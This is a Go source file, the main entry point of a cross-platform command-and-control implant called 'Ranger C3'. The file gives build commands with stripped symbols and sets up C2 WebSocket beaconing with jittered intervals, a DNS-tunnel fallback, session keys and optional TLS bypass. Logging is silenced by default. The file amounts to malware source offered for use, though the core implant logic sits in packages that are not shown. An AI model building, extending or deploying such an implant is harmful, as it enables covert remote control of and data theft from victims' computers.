// Ranger C3 Implant - Multi-platform agent
//
// Cross-compile with:
//
//	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o implant.exe ./cmd/implant
//	GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -o implant     ./cmd/implant
//	GOOS=darwin  GOARCH=amd64 go build -ldflags="-s -w" -o implant_mac ./cmd/implant
package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"runtime"
	"time"

	"git.churchofmalware.org/ek0mssavi0r/Ranger-C3/internal/crypto"
	"git.churchofmalware.org/ek0mssavi0r/Ranger-C3/internal/implantpkg"
)

func main() {
	c2URL := flag.String("c2", "wss://127.0.0.1:4443/ws", "C2 WebSocket URL")
	dnsDomain := flag.String("dns", "", "DNS tunnel domain (fallback)")
	beaconMin := flag.Int("beacon-min", 60, "Min beacon interval (sec)")
	beaconMax := flag.Int("beacon-max", 300, "Max beacon interval (sec)")
	debug := flag.Bool("debug", false, "Enable debug logging")
	keyHex := flag.String("key", "", "Session key hex (auto if empty)")
	insecure := flag.Bool("insecure", false, "Skip TLS certificate verification (self-signed C2)")
	caFile := flag.String("ca", "", "PEM file with CA / server certificate to trust")
	fingerprint := flag.String("fingerprint", "", "Pin the C2 certificate by SHA-256 fingerprint (hex)")
	flag.Parse()

	// Session key
	var sessionKey []byte
	if *keyHex != "" {
		var err error
		sessionKey, err = crypto.HexDecode(*keyHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "bad key: %v\n", err)
			os.Exit(1)
		}
	} else {
		sessionKey = make([]byte, 32)
		rand.Read(sessionKey)
	}

	if !*debug {
		log.SetOutput(io.Discard)
	}

	cfg := implantpkg.Config{
		C2URL:         *c2URL,
		SessionKey:    sessionKey,
		DNSDomain:     *dnsDomain,
		BeaconMin:     *beaconMin,
		BeaconMax:     *beaconMax,
		Debug:         *debug,
		SkipTLSVerify: *insecure,
		CAFile:        *caFile,
		C2Fingerprint: *fingerprint,
	}

	im := implantpkg.New(cfg)
	fmt.Printf("[implant] started on %s/%s | id: %s\n",
		runtime.GOOS, runtime.GOARCH, im.ID())

	if err := im.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "[implant] error: %v\n", err)
		os.Exit(1)
	}
}

// Helper for hex decode
var _ = time.Second
